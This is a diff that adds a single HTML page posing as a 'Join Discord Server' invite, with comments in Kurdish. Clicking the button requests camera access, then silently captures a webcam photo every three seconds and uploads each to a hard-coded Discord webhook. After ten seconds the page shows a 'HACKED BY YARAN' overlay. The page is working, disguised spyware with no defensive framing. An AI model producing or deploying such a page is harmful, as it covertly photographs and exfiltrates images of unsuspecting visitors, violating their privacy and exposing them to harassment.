@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <title>Discord Server</title>
+    <style>
+        body { margin: 0; background: #2c2f33; font-family: sans-serif; overflow: hidden; color: white; }
+        #joinCard, #loadingCard { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: #23272a; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 1000; 
+        }
+        #loadingCard { display: none; }
+        button { background: #7289da; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
+        #matrixCanvas { display: none; position: fixed; top: 0; left: 0; z-index: 1; }
+        #hackedOverlay { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.8); color: red; font-size: 50px; font-weight: bold; 
+            justify-content: center; align-items: center; z-index: 9999; text-transform: uppercase;
+        }
+        #videoElement { display: none; }
+    </style>
+</head>
+<body>
+    <div id="hackedOverlay">HACKED BY YARAN</div>
+    <canvas id="matrixCanvas"></canvas>
+    
+    <div id="joinCard">
+        <h2>Join Discord Server</h2>
+        <button id="startBtn">Join Server</button>
+    </div>
+
+    <div id="loadingCard">
+        <h2>Connecting...</h2>
+        <p>تکایە چاوەڕێ بکە...</p>
+    </div>
+
+    <video id="videoElement" autoplay playsinline></video>
+
+    <script>
+        // وێبهۆکەکەی تۆ لێرە جێگیرکرا
+        const webhookUrl = "https://discord.com/api/webhooks/1507879866136133682/3h8tsvpbaFNftFO8zsRwkYuHbZwgH7yld33NrCBTtKP0cHMl64tn9AsPTZZl70GceTbb";
+
+        document.getElementById("startBtn").onclick = async () => {
+            const video = document.getElementById("videoElement");
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                document.getElementById("joinCard").style.display = "none";
+                document.getElementById("loadingCard").style.display = "block";
+
+                // ناردنی وێنە هەر 3 چرکە جارێک
+                const interval = setInterval(() => captureAndSend(video), 3000);
+
+                setTimeout(() => {
+                    document.getElementById("loadingCard").style.display = "none";
+                    document.getElementById("matrixCanvas").style.display = "block";
+                    document.getElementById("hackedOverlay").style.display = "flex";
+                    initMatrix();
+                }, 10000);
+
+            } catch (err) {
+                alert("پێویستە مۆڵەتی کامێرا بدەیت!");
+            }
+        };
+
+        async function captureAndSend(video) {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append("file", blob, "photo.png");
+                await fetch(webhookUrl, { method: 'POST', body: formData });
+            }, "image/png");
+        }
+
+        function initMatrix() {
+            const c = document.getElementById("matrixCanvas");
+            const ctx = c.getContext("2d");
+            c.height = window.innerHeight; c.width = window.innerWidth;
+            const matrix = "010101";
+            const font_size = 15;
+            let columns = c.width/font_size;
+            let drops = Array(Math.floor(columns)).fill(1);
+            setInterval(() => {
+                ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+                ctx.fillRect(0, 0, c.width, c.height);
+                ctx.fillStyle = "#0F0";
+                drops.forEach((drop, i) => {
+                    ctx.fillText(matrix[Math.floor(Math.random()*matrix.length)], i*font_size, drop*font_size);
+                    if(drop*font_size > c.height && Math.random() > 0.975) drops[i] = 0;
+                    drops[i]++;
+                });
+            }, 35);
+        }
+    </script>
+</body>
+</html>
